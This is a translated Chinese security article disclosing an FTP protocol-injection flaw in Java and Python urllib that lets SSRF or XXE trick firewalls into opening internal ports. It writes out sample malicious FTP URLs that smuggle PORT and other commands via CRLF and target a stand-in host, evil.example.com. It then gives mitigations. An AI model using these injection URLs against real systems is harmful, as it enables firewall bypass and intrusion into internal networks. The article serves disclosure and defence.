# 【技术分享】Java和Python中的FTP注入漏洞可使攻击者绕过防火墙

#### 译文声明
本文为翻译文章，原文来源：blindspotsecurity.com。具体内容及含义请以原文为准。
翻译：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)
预估稿费：200 RMB
投稿方式：发送邮件至 [linwei#360.cn](mailto:PI:EMAIL) 或访问 [网页版](http://bobao.360.cn/contribute/index) 在线投稿。

## 概述
最近，安全研究人员在Java的FTP URL处理代码中发现了一个协议流注入漏洞。研究表明，如果这个漏洞与XXE（XML External Entity）或SSRF（Server-Side Request Forgery）漏洞结合使用，攻击者可以通过SMTP协议让存在漏洞的Java应用程序未经许可地发送恶意邮件。

多年来，我一直研究这种协议注入漏洞。根据我的研究，这种FTP协议注入漏洞允许攻击者绕过目标设备的防火墙，并与目标主机系统建立远程TCP连接（端口1024-65535）。类似的漏洞也存在于Python的urllib2和urllib库中，但值得注意的是，Java漏洞可以针对桌面用户进行攻击，即使用户没有启用任何Java浏览器插件。

## 漏洞信息
在多种情况下，攻击者可以利用恶意URL和FTP协议流注入漏洞对Java应用程序实施攻击。如果攻击者能让目标Java应用程序尝试获取恶意URL指向的资源，则可以在客户端的协议流中注入FTP命令。例如，考虑以下URL：
```plaintext
ftp://foo:bar%0d%PI:EMAIL/file.png
```
这会向TCP流数据中添加新行，使接收信息的服务器认为“INJECTED”是客户端单独发送的一条命令。当Java应用程序获取到此URL时，它会被拆分为多个单独的指令序列并发送：
```plaintext
USER foo
PASS bar
INJECTED
TYPE I
EPSV ALL
PASV
...
```
实际上，在Java中，URL中的多个数据字段都可能导致注入攻击，包括用户名字段以及地址中指定的任何目录。虽然Python的网络库（Python 2 的 urllib2 和 Python 3 的 urllib）也有类似的协议流注入漏洞，但Python中的这种漏洞仅限于通过URL中的特定目录名称来实施攻击。

## FTP的安全问题
要完全理解接下来介绍的攻击，需要扎实掌握FTP协议的工作机制。FTP通信涉及两条连接：控制通道和数据通道。在控制通道中，客户端通常通过端口21与服务器建立一条TCP连接，并通过这条连接发送各种命令；而数据通道主要用于传输文件内容和其他数据。

传统的FTP协议描述如下：FTP客户端告诉服务器如何与其连接，然后服务器通过给定的IP地址和随机端口号与客户端重新连接，成功后通过临时信道向客户端发送请求数据。然而，随着NAT（网络地址转换）的普及，传统模式的FTP通信出现问题，因此引入了“被动模式”。在被动模式中，数据通道由客户端发起建立。随着时间推移，防火墙也开始支持传统模式的FTP，它们可以执行控制通道协议审查，并利用动态路由算法将服务器端发起的TCP连接定向转发到相应的主机。

实际上，传统模式的FTP和防火墙一直存在安全风险。这种攻击技术首次曝光是在2002年，当时一名用户意外加载了一个非特权Java Applet，该Applet可以让目标主机建立一条指向攻击者服务器的FTP控制通道，欺骗防火墙开启任意TCP端口并保障通信正常进行。尽管已经过去了十五年，许多商业防火墙仍然默认支持传统模式的FTP。

## 欺骗防火墙
由于FTP控制通道注入漏洞允许我们控制FTP客户端发送的命令，现在可以尝试十五年前的那种防火墙攻击。例如，我们可以向流数据中注入一个恶意的PORT命令，当防火墙看到这个命令时，它会将内部IP地址和端口转换为外部IP及端口，启用临时的NAT规则并允许建立单向TCP连接，将数据转发给FTP客户端。

假设目标主机的内部IP地址为10.1.1.1，攻击者服务器为evil.example.com。我们可以通过以下URL欺骗防火墙开启1337端口：
```plaintext
ftp://u:PI:EMAIL/foodir%0APORT%2010,1,1,1,5,57/z.txt
```
在传统模式FTP的PORT命令中，端口号被切分为两个ASCII码字节，即1337 == 5*256 + 57。但要实现攻击，还需解决两个问题。

### 问题一：确定内部IP地址
首先，攻击者需要确定目标主机的内部IP地址，否则防火墙将忽略我们注入的PORT命令。攻击者可以发送一个URL，观察客户端的行为，不断重复操作直到攻击成功。例如，攻击者可以提供一个指向攻击者服务器非常用端口的FTP URL：
```plaintext
ftp://u:PI:EMAIL:31337/foodir/z.txt
```
请注意，这里还不需要进行协议流注入尝试。FTP客户端会尝试建立被动会话并获取z.txt文件，但如果攻击者的FTP服务器拒绝PASV命令，客户端将以传统模式发送PORT命令。由于控制通道使用非标准端口，目标主机的防火墙不太可能解析会话中的PORT命令，从而导致内部IP地址泄露给攻击者。

### 问题二：数据包分组
FTP是一种同步、基于文本行的协议，通信双方的数据按行传输。这意味着一方在得到对方响应之前，最多只能写一行命令。

但在Linux下，实现攻击的前提是数据包头部出现PORT命令（因为大多数商业防火墙安装在Linux平台上）。因此，以下URL不会让Linux防火墙开启目标端口：
```plaintext
ftp://u:PI:EMAIL/foodir%0APORT%2010,1,1,1,5,57/z.txt
```
仔细分析这个URL，可以看到客户端发送的命令被划分为单独的分组：
```plaintext
--Packet 1--    USER u
--Packet 2--    PASS p
--Packet 3--    TYPE I
--Packet 4--    CWD foodir
PORT 10,1,1,1,5,57
--Packet 5--    ...
```
由于PORT命令出现在Packet 4中，Linux将忽略它。我们需要让客户端将PORT命令放在数据包的头部。我们知道Java或Python可以在一次write(2)调用中发送两条指令，如果我们使用的CWD命令足够长并填充满一个TCP数据包，那么PORT命令自然会被挤到下一个数据包的头部。

## 攻击PoC
为了验证攻击，我开发了一个攻击脚本，但在Oracle公司和Python开发者修复相应漏洞之前不会发布。脚本首先会给攻击者提供一个URL来测试目标主机，然后自动建立一个恶意FTP服务器。当服务器接收到第一个请求后，计算出一个长度足以让PORT命令出现在数据包头部的新URL。通常，完整的攻击过程只需三次SSRF攻击即可在目标主机上开启一个TCP端口，每次额外的SSRF攻击都可以开启另一个TCP端口。大多数防火墙不允许客户端通过1024以下的端口建立数据通道，因此攻击者的目标端口范围通常是1024-65535。

## 攻击场景
### 1. JNLP文件
这可能是最令人惊讶的攻击场景之一。如果安装了Java的桌面用户访问恶意站点，即使禁用了Java applet，攻击者仍可以让Java Web解析包含恶意FTP URL的JNLP文件。聪明的攻击者首先确定目标用户的内部IP地址，判断适当的数据包分组，最后利用漏洞一次性完成攻击（仅用一个JNLP文件即可开启多个通信端口）。由于Java会在发出安全警告前完成JNLP文件的解析工作，因此攻击会在用户不知情的情况下完成。

### 2. 中间人攻击
如果Java或Python (urllib) 应用程序正在访问某个HTTP URL，拥有特权的网络攻击者可以通过注入HTTP重定向来发动攻击。

### 3. 服务器端请求伪造（SSRF）
如果应用程序接收HTTP、HTTPS或FTP URL，攻击过程就很容易，因为攻击者可以直接将目标客户端重定向到恶意FTP URL。

### 4. XML外部实体注入攻击（XXE）
由于XML解析设置的问题，大多数XXE漏洞在实际情况下无法利用。但在某些情况下，SSRF仍然可以通过DOCTYPE头来实现。如果XML解析器支持外部实体，我们可以在单一文件中注入URL，确定目标的内部IP地址和分组大小，最终利用动态重定向完成一次XXE攻击。

## 给厂商的建议
### 商业防火墙供应商
- 默认禁用传统模式的FTP。
- 在配置接口过程中提供必要的警告提示。

### Linux netfilter团队
- 在conntrack开发文档中注明开启FTP转换可能带来的安全风险，以避免其他开发者和商业设备提供商再犯同样的错误。

### 其他软件制造商和服务提供商
- 对自家应用或服务进行安全审查，确保它们不受SSRF或XXE攻击的影响。

## 缓解方案
1. 暂时卸载桌面系统中安装的Java。如果考虑到其他应用的依赖问题，用户也可以暂时禁用浏览器中的所有Java插件，并取消.jnlp文件的关联。
2. 更新系统中所有的Java和Python版本。
3. 禁用防火墙对传统模式FTP的支持，只允许被动模式。